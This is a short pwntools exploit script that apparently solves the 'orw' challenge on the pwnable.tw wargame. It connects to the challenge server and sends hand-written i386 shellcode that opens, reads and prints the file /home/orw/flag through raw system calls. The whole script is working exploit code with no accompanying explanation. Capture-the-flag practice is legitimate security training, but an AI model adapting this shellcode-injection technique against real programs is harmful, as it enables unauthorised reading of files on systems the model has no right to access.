from pwn import *
p=process('./orw')
context(arch='i386',log_level='debug')
p=remote('chall.pwnable.tw',10001)
# gdb.attach(p,'b *0x804858a')
shellcode="""
	mov eax,2
	call open_ebx
	.ascii "/home/orw/flag"
    .byte 0
open_ebx:
	pop ebx

	mov eax,5
	mov ecx,0
	int 0x80 #open("/home/orw/flag","r+");
	mov eax,3
	mov ebx,3
	mov ecx,0x0804a800
	mov edx,40
	int 0x80 #read(3,buf,40)
	mov eax,4
	mov ebx,1
	mov ecx,0x0804a800
	mov edx,40
	int 0x80 #write(1,buf,40)
"""
shellcode=asm(shellcode,arch='i386')
p.recv()
p.send(shellcode)
# p.recv()
p.interactive()